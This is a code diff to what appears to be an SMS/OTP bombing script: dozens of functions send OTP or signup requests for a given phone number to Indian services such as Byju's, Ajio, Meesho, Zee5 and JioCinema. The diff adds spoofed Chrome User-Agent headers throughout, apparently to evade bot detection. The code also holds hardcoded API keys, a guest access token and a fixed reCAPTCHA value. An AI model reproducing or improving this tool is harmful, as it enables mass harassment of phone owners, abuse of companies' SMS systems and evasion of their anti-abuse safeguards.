@@ -34,6 +34,7 @@ async function mywallety(number) {
         fetch("https://www.mywalletly.in/api/", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: prepaire_hash_data({
@@ -65,6 +66,7 @@ async function infinitylearn(number) {
         fetch("https://otp.infinitylearn.com/api/generateOTP", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "isd_code": "+91", "phone": number, "tenant_id": "1", "product_id": "300" })
@@ -90,6 +92,7 @@ async function my11circle(number) {
         fetch("https://www.my11circle.com/api/fl/auth/v3/getOtp", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -123,6 +126,7 @@ async function housing(number) {
         fetch("https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "query": "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n    $method: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n      method: $method\n    ) {\n      success\n      message\n    }\n  }\n", "variables": { "phone": number, "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" } })
@@ -179,6 +183,7 @@ async function fantv(number) {
         fetch("https://admin.artistfirst.in/v1/auth/login-signup", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -208,6 +213,7 @@ async function byjus(number) {
         fetch("https://identity.tllms.com/api/request_otp", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -258,6 +264,7 @@ async function unacademy(number) {
         fetch("https://unacademy.com/api/v3/user/user_check/?enable-email=true", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "phone": number, "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false })
@@ -283,6 +290,7 @@ async function medibuddy(number) {
         fetch("https://loginprod.medibuddy.in/unified-login/user/register", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -316,6 +324,7 @@ async function momsco(number) {
         fetch("https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "g-recaptcha-action": "sendOtp",
                 "g-recaptcha-response": "c00da4f9-b137-4a4a-b548-25e1618ee603"
@@ -349,6 +358,7 @@ async function ajio(number) {
         fetch("https://login.web.ajio.com/api/auth/generateLoginOTP", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -368,6 +378,7 @@ async function ajio(number) {
                 fetch("https://login.web.ajio.com/api/auth/signupSendOTP", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
@@ -405,6 +416,7 @@ async function nxtwave(number) {
         fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/login/phone_number/v1/", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -425,6 +437,7 @@ async function nxtwave(number) {
                 fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/create_with_phone_number/v1/", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"", "clientKeyDetailsId": 1 })
@@ -435,6 +448,7 @@ async function nxtwave(number) {
                         fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/send_otp_to_user_with_phone_number/v1/", {
                             method: "POST",
                             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                                 "Content-Type": "application/json"
                             },
                             body: JSON.stringify({ "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"", "clientKeyDetailsId": 1 })
@@ -457,6 +471,7 @@ async function tradex(number) {
         fetch("https://api.tradexapp.co/v2/sendotp", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -487,6 +502,7 @@ async function kukufm(number) {
         fetch("https://kukufm.com/api/v1/users/auth/send-otp/", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -514,6 +530,7 @@ async function blinkit(number) {
         fetch("https://blinkit.com/v2/accounts/", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
             },
@@ -563,6 +580,7 @@ async function probo(number) {
         fetch("https://prod.api.probo.in/api/v1/user/login", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "x-device-os": "ANDROID",
                 "x-version-name": "10",
@@ -597,6 +615,7 @@ async function eatclub(number) {
         fetch("https://accounts.box8.co.in/customers/sign_up?origin=eatClub&platform=web", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "authorization": authorization
             },
@@ -618,6 +637,7 @@ async function eatclub(number) {
                 fetch("https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json",
                         "authorization": authorization
                     },
@@ -647,6 +667,7 @@ async function croma(number) {
         fetch("https://api.tatadigital.com/api/v2/sso/check-phone-croma", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "client_id": "CROMA-WEB-APP"
             },
@@ -666,6 +687,7 @@ async function croma(number) {
                 fetch("https://api.tatadigital.com/api/v2/sso/check-phone", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json",
                         "client_id": "CROMA-WEB-APP"
                     },
@@ -709,6 +731,7 @@ async function hoichoi(number) {
         fetch("https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-" + hoichoirandom() + "b43-1ea6-02dd-860c-" + hoichoirandom() + "bfc5b1f", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -728,6 +751,7 @@ async function hoichoi(number) {
                 fetch("https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-" + hoichoirandom() + "-a627-f106-af27-2b7" + hoichoirandom() + "5d82", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json",
                         "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
                     },
@@ -761,6 +785,7 @@ async function jiocinema(number) {
         fetch("https://auth-jiocinema.voot.com/userservice/apis/v4/loginotp/send", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "accesstoken": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJJZCI6IjBiNmExMjM3LWE0YzUtNDk3Ny1hY2U4LWJjNjU4ZjFmNmM1ZiIsInVzZXJUeXBlIjoiR1VFU1QiLCJhcHBOYW1lIjoiUkpJTF9KaW9DaW5lbWEiLCJkZXZpY2VJZCI6IjA4ZjYzZWE0LWZlYmMtNGI0Mi04YWRlLTA4OWI3NmFjN2ExZSIsImRldmljZVR5cGUiOiJwYyIsIm9zIjoid2ViIiwicHJvZmlsZUlkIjoiM2E5NzdkNzUtZjk0OS00NzQwLThhOTMtMGI5NGZkZTUyYjdiIiwiYWRJZCI6IjA4ZjYzZWE0LWZlYmMtNGI0Mi04YWRlLTA4OWI3NmFjN2ExZSIsImV4cGVyaW1lbnRLZXkiOnsiY29uZmlnS2V5IjoiM2E5NzdkNzUtZjk0OS00NzQwLThhOTMtMGI5NGZkZTUyYjdiIiwiZ3JvdXBJZCI6NTM1OX0sInByb2ZpbGVEZXRhaWxzIjp7InByb2ZpbGVUeXBlIjoiYWR1bHQiLCJjb250ZW50QWdlUmF0aW5nIjoiQSJ9LCJ2ZXJzaW9uIjoyMDI0MDMwNDB9LCJleHAiOjE3MjcyNzQ3NTAsImlhdCI6MTcyNDY4Mjc1MH0.CVWts8Wrwf4rg4PyHYVUCC_h1xkZXT-MN-SwNWaAnyTZezttWbNVhKSUsQ9zy89O79_8DmIiVSyXEyl6ULa_HQ",
                 "appname": "RJIL_JioCinema",
@@ -794,6 +819,7 @@ async function fancode(number) {
         fetch("https://www.fancode.com/graphql", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "expcapability": "true",
                 "fc-device-type": "desktop",
@@ -851,8 +877,8 @@ async function meesho(number) {
         fetch("https://www.meesho.com/api/v1/user/login/request-otp", {
             method: "POST",
             headers: {
-                "Content-Type": "application/json",
-                "User-Agent": "PostmanRuntime/7.41.2"
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+                "Content-Type": "application/json"
             },
             body: JSON.stringify({
                 "phone_number": number
@@ -894,6 +920,7 @@ async function zee5(number) {
         fetch("https://auth.zee5.com/v1/user/sendotp", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "device_id": deviceid,
                 "esk": token
@@ -921,6 +948,7 @@ async function mamaearth(number) {
         fetch("https://auth.mamaearth.in/v1/auth/initiate-signup", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "mobile": number, "referralCode": "" })
@@ -938,6 +966,7 @@ async function mamaearth(number) {
                 fetch("https://auth.mamaearth.in/v1/auth/send-otp", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "mobile": number, "isGokwik": false })
@@ -965,6 +994,7 @@ async function derma(number) {
         fetch("https://auth.thedermaco.com/v1/auth/initiate-signup", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "mobile": number, "referralCode": "" })
@@ -982,6 +1012,7 @@ async function derma(number) {
                 fetch("https://auth.thedermaco.com/v1/auth/send-otp", {
                     method: "POST",
                     headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "mobile": number, "isGokwik": false })
@@ -1012,6 +1043,7 @@ async function uspolo(number) {
         fetch("https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", {
             method: "POST",
             headers: {
+                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                 "Content-Type": "application/json",
                 "shop_name": "u-s-polo-assn-india.myshopify.com",
                 "action": "sendOTP"
